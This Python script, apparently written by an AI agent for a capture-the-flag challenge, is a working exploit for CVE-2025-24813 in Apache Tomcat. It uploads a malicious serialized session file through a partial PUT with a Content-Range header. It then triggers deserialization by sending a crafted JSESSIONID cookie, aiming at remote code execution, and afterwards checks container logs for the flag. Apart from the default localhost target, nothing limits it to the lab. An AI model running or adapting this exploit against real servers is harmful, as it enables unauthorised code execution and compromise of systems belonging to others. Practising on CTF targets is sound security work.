#!/usr/bin/env python3
"""
CVE-2025-24813 Exploit for ashenvault challenge
Author: AI Agent
Date: 2025-11-20
Purpose: Exploit Tomcat session deserialization vulnerability to get the flag
"""

import requests
import sys
from urllib.parse import urljoin

def exploit(target_url):
    print("[*] CVE-2025-24813 Exploit")
    print(f"[*] Target: {target_url}")

    # Read the malicious serialized payload
    with open('payload.ser', 'rb') as f:
        payload = f.read()

    print(f"[*] Payload size: {len(payload)} bytes")

    # Step 1: Upload malicious session file using partial PUT
    session_id = "rce456"

    print(f"[*] Uploading malicious session file with ID: {session_id}")

    # Use partial PUT with Content-Range header
    headers = {
        'Content-Range': f'bytes 0-{len(payload)-1}/{len(payload)}',
        'Content-Type': 'application/octet-stream'
    }

    # Upload with .session extension - Tomcat FileStore expects this format
    upload_url = urljoin(target_url, f"/{session_id}.session")

    response = requests.put(upload_url, data=payload, headers=headers, allow_redirects=False)
    print(f"[*] Upload response: {response.status_code}")

    if response.status_code in [200, 201, 204]:
        print("[+] Payload uploaded successfully!")
    else:
        print(f"[-] Upload failed with status {response.status_code}")
        print(f"[-] Response: {response.text[:200]}")

    # Step 2: Trigger deserialization by accessing with JSESSIONID cookie
    # FileStore looks for .sessionid.session files
    jsessionid_value = f"{session_id}.session"
    print(f"[*] Triggering deserialization with JSESSIONID={jsessionid_value}")

    cookies = {'JSESSIONID': jsessionid_value}
    trigger_url = urljoin(target_url, "/")

    response = requests.get(trigger_url, cookies=cookies, allow_redirects=False)
    print(f"[*] Trigger response: {response.status_code}")
    print(f"[*] Response headers: {dict(response.headers)}")
    print(f"[*] Response preview: {response.text[:500]}")

    # Check Docker logs for the flag output
    print("\n[*] Check Docker logs for flag output:")
    print("[*] Run: docker logs challenge-web-1 | grep -i 'FLAG\\|HTB'")

    return response

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8081"
    exploit(target)
